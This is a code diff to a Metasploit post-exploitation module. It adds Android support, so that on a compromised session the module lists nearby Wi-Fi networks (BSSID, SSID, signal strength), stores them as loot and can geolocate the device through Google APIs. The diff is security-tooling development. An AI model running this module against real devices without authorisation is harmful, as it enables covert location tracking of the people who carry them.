@@ -15,7 +15,7 @@ class MetasploitModule < Msf::Post
         performing a lookup against Google APIs.},
         'License'       => MSF_LICENSE,
         'Author'        => [ 'Tom Sellers <tom[at]fadedcode.net>'],
-        'Platform'      => %w{ osx win linux bsd solaris },
+        'Platform'      => %w{ android osx win linux bsd solaris },
         'SessionTypes'  => [ 'meterpreter', 'shell' ],
       ))
 
@@ -102,11 +102,9 @@ class MetasploitModule < Msf::Post
       print_error("Error: #{e}")
     else
       print_status(g.to_s)
-      print_status("Google Maps URL:  #{g.google_maps_url}")
+      print_status("Google Maps URL: #{g.google_maps_url}")
     end
-
   end
-
 
   # Run Method for when run command is issued
   def run
@@ -185,9 +183,31 @@ class MetasploitModule < Msf::Post
         print_error("Geolocation is not supported on this platform.\n\n") if datastore['GEOLOCATE']
         return
       end
-
+    when 'android'
+      log = client.android.wlan_geolocate
+      listing = ''
+      wlan_list = []
+      log.each do |x|
+        mac = x['bssid']
+        ssid = x['ssid']
+        ss = x['level'].to_s
+        listing += "BSSID: #{mac}\n"
+        listing += "SSID: #{ssid}\n"
+        listing += "Strength: #{ss}\n\n"
+        wlan_list << [mac, ssid, ss]
+      end
+      if listing.blank?
+        print_error("Unable to generate wireless listing.")
+        return nil
+      end
+      store_loot("host.android.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
+      print_good("Target's wireless networks:\n\n#{listing}\n")
+      if datastore['GEOLOCATE']
+        perform_geolocation(wlan_list)
+        return
+      end
     else
-      print_error("The target's platform, #{platform}, is not supported at this time.")
+      print_error("The target's platform, #{session.platform}, is not supported at this time.")
       return nil
     end
 
